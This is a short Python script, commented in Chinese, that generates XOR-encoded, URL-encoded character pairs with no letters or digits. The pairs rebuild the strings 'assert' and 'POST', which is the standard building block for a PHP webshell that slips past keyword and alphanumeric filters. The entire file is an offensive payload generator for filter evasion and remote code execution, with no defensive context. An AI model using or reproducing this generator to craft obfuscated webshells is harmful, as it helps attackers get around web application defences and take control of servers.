from urllib import parse
def get_xor(string):
    result=''
    for i in string:
        flag = 0  # 判断是否有找到符合条件的
        for j in range(127):
            if word_filter(j):
                continue
            if flag:
                break
            for k in range(127):
                if word_filter(k):
                    continue
                if j^k==ord(i):
                    result+="('{0}'^'{1}').".format(is_urlencode(j),is_urlencode(k))
                    flag=1
                    break
    print(result[0:len(result)-1])
def word_filter(num):#判断是否是字母和数字
    word=chr(num)
    if word.isdigit() or word.isalpha() or word=="\\":
        return True
    return False
def is_urlencode(num):#对不可打印字符进行url编码
    if num<32:
        return parse.quote(chr(num))
    else:
        return chr(num)
get_xor("assert")
get_xor("POST")